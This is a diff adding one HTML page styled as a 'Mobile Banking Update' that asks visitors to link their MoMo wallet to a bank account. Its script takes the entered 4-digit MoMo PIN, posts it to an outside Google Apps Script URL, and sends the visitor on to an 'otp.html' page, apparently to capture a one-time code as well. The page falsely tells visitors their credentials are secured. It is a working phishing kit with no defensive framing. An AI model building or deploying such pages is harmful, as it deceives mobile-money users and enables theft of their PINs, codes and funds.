@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MOBILE BANKING UPDATE</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #003366, #004080);
+      color: #003366;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 0 10px;
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      width: 100%;
+      padding: 40px 20px 60px;
+      background: linear-gradient(135deg, #003d73, #004d99);
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.25);
+      position: relative;
+      color: #fff;
+    }
+
+    .header h1 {
+      margin: 0;
+      font-size: 22px;
+      font-weight: bold;
+      color: #ffcc00;
+    }
+
+    .header p {
+      margin-top: 8px;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    /* Form container */
+    .form-container {
+      background: #fff;
+      width: 100%;
+      max-width: 380px;
+      padding: 35px 25px;
+      border-radius: 25px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+      margin-top: -40px;
+      z-index: 1;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #003366;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      background-color: #f9f9f9;
+      color: #003366;
+      font-size: 16px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    /* Oval button like MoMo style */
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: bold;
+      background: #ffcc00;
+      color: #003366;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.25);
+    }
+
+    .btn-submit:hover {
+      background: #ffd633;
+      transform: scale(1.03);
+    }
+
+    .notice {
+      font-size: 13px;
+      color: #666;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    /* Processing overlay */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffcc00;
+      font-size: 20px;
+      font-weight: bold;
+      z-index: 100;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    @media (max-width: 500px) {
+      .header h1 { font-size: 20px; }
+      .form-container { padding: 25px 15px; }
+      .btn-submit { font-size: 15px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>MOBILE BANKING UPDATE</h1>
+    <p>ACCOUNT TO WALLET ACTIVATION<br>
+       Link your MoMo to your Bank Account Below
+    </p>
+  </div>
+
+  <div class="form-container">
+    <form id="momoForm">
+      <label for="momo_code">Enter 4-digit MoMo Code</label>
+      <input type="text" id="momo_code" name="momo_code" placeholder="xxxx" maxlength="4" required>
+
+      <button type="submit" class="btn-submit">Link Wallet →</button>
+
+      <div class="notice" id="status">Your credentials are secured.</div>
+    </form>
+  </div>
+
+  <div class="overlay" id="overlay">Processing…</div>
+
+  <script>
+    const form = document.getElementById('momoForm');
+    const statusEl = document.getElementById('status');
+    const overlay = document.getElementById('overlay');
+
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxJ1nxxUbrn8N7ancnw_Tc2gUJBJbvsOzuwRR5wJYNS1bF_0bckmYAYeItN1-eEsNbT/exec";
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      overlay.classList.add('active');
+      statusEl.textContent = "Submitting...";
+      statusEl.style.color = "#003366";
+
+      const momo_code = document.getElementById('momo_code').value.trim();
+      const formData = new FormData();
+      formData.append("momo_code", momo_code);
+
+      try {
+        const resp = await fetch(WEBAPP_URL, { method: 'POST', body: formData });
+        const text = await resp.text();
+        let json;
+
+        try {
+          json = JSON.parse(text);
+        } catch {
+          overlay.classList.remove('active');
+          statusEl.textContent = "Server error: " + text;
+          statusEl.style.color = "#cc0000";
+          return;
+        }
+
+        if (json.result === "success") {
+          statusEl.textContent = "Pin successfully submitted!";
+          statusEl.style.color = "#00a859";
+          setTimeout(() => window.location.href = "otp.html", 1500);
+        } else {
+          overlay.classList.remove('active');
+          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
+          statusEl.style.color = "#cc0000";
+        }
+      } catch (err) {
+        overlay.classList.remove('active');
+        statusEl.textContent = "Network error. Try again.";
+        statusEl.style.color = "#cc0000";
+      }
+    });
+  </script>
+</body>
+</html>
